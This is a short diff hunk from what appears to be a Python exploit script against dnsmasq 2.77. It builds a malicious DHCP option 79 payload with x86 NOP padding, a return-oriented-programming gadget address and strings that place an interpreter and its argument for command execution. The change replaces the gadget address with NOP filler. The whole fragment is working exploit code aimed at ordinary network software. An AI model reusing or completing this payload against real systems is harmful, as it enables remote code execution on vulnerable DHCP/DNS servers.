@@ -257,7 +257,7 @@ if __name__ == '__main__':
         option_79 += Base.pack32(NOPx86)  # EDI = 0x90909090
 
         if dnsmasq_version == "2.77":
-            option_79 += Base.pack32(0x08080DDE)  # EBP ; ret (JUNK)
+            option_79 += Base.pack32(NOPx86)  # EBP = 0x90909090
 
         option_79 += add_string_in_data(interpreter_addr, interpreter)
         option_79 += add_string_in_data(interpreter_arg_addr, interpreter_arg)
